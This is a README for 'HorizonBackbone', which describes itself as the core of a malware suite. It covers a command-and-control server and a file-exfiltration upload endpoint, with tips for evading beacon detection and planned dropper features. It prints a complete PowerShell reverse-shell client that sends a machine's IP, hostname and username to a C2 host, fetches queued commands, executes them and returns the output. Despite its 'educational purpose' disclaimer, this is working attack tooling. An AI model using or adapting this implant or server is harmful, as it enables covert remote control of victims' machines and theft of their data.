```
██╗  ██╗ ██████╗ ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗███████╗
██║  ██║██╔═══██╗██╔══██╗██║╚══███╔╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝
███████║██║   ██║██████╔╝██║  ███╔╝ ██║   ██║██╔██╗ ██║██████╔╝███████║██║     █████╔╝ ██████╔╝██║   ██║██╔██╗ ██║█████╗  
██╔══██║██║   ██║██╔══██╗██║ ███╔╝  ██║   ██║██║╚██╗██║██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝██║  ██║██║███████╗╚██████╔╝██║ ╚████║██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

-----------------------------------------------------------------------------------

**THIS SERVICE IS DESIGNED FOR EDUCATIONAL PURPOSE ONLY! DO NOT USE IT FOR ILLEGAL PURPOSES!**

***Go to the [development-microservices](https://github.com/maxbirnbacher/HorizonBackbone/tree/development-microservices) branch for a preview of the microservices version (currently in development and not ready for production).***

The heart of the Horizon Malware Suite and used for all kinds of things.

## Roadmap

- [X] List files
- [x] Simple web-interface
- [x] File download
- [ ] Delete file(s)
- [X] Make a better UI for the web-interface
- [X] C2 Server and API
- [X] Frontend for C2 Server
- [ ] API & frontend authentication
- [ ] Dynamic creation of stagers/droppers
- [ ] Frontend-Dialog for stager/dropper creation
- [ ] File upload for droppers


## Setup & Start

Clone the repository and run `docker-compose build` to build the images.

Start the stack with `docker-compose up -d` and you are good to go.

## Usage

### Dashboard

After starting the stack you can access the Webinterface by accessing `http://SERVER_IP_OR_DOMAIN:8000` in your browser.

There you can (*currently*) choose between the Data Exfiltration and the C2 Server.

### Data Exfiltration

To exfiltrate data you can use the '/upload' endpoint.

You can see your uploaded files under `http://SERVER_IP_OR_DOMAIN:8000/list-files-view`.

![DataExfil](https://github.com/maxbirnbacher/HorizonBackbone/assets/66524685/39b7923c-8328-4672-8dc7-5f75cc725565)

If you click on the filename you can access the file and download it.

![FileView](https://github.com/maxbirnbacher/HorizonBackbone/assets/66524685/75e3ff57-d2e7-45da-8c4d-8f8beffb0653)

### C2 Server

The C2 Server is intended for long-term usage. Communication should take place over a long period of time that are non-linear to avoid beacon detection.

The workflow is as follows:

1. Register a new client. This will create a new client in the database and return a unique ID. This ID is used for all further communication with the client. (`http://SERVER_IP_OR_DOMAIN:8000/register`)
2. Queue new commands for the client via the web-interface in the detail view of each client.
3. The client will check for new command(s) after the specified interval and execute it/them. (`http://SERVER_IP_OR_DOMAIN:8000/commands/{connection_id}`)
4. The client will send the results of the command(s) to the server. (`http://SERVER_IP_OR_DOMAIN:8000/output/send/{connection_id}`)
5. The server will store the results in the database and make them available via the web-interface. Hit the refresh button in the detail view of the client to see the output.
6. Unregister the client if you don't need it anymore. (`http://SERVER_IP_OR_DOMAIN:8000/unregister/{connection_id}`) *interface currently in development*

#### Reverse Shell Example

Here is an example of a reverse shell using the C2 Server.

```PowerShell
$ip_address=((ipconfig|Select-String "IPv4 Address").ToString() -split ": ")[-1];$os_type=(Get-WmiObject -Class Win32_OperatingSystem).Caption;$hostname=(Get-WmiObject -Class Win32_ComputerSystem).Name;$username=[Environment]::UserName;$main_url="http://10.0.0.9:8000";$interval=30;$intervalUnit="Seconds";$body=@{os_type=$os_type;ip_address=$ip_address;hostname=$hostname;username=$username;password="placeholder"}|ConvertTo-Json;Write-Host "IP Address: $ip_address";Write-Host "OS Type: $os_type";Write-Host "Hostname: $hostname";Write-Host "Username: $username";$url="http://10.0.0.9:8000/register?os_type=$os_type&ip_address=$ip_address&hostname=$hostname&username=$username&password=$password";$response=Invoke-RestMethod -Method Post -Uri $url;$connection_id=$response.id;Write-Host "Registered connection with ID: $connection_id";while($true){$url="$main_url/commands/$connection_id";$command=Invoke-RestMethod -Method Get -Uri $url;Write-Host "Received command: $command";if([string]::IsNullOrEmpty($command)){write-host "No command received yet...";$startSleepCmd="Start-Sleep -$intervalUnit $interval";$startSleepCmdStr=[String]$startSleepCmd;Invoke-Expression $startSleepCmdStr;continue;}if($command -eq "exit"){write-host "Exiting...";break;}write-host "Executing command: $command";if($command -ne "" -or $null -ne $command){$commandStr=[String]$command;$result=Invoke-Expression $commandStr;$output=$result|Out-String;$body=@{output=$output}|ConvertTo-Json;$url="$main_url/output/send/$connection_id";$body=@{output=$output}|ConvertTo-Json;Invoke-RestMethod -Method Post -Uri $url -Body $body;}}
```

### API

You can find all the API endpoints in the under `http://SERVER_IP_OR_DOMAIN:8000/docs`.





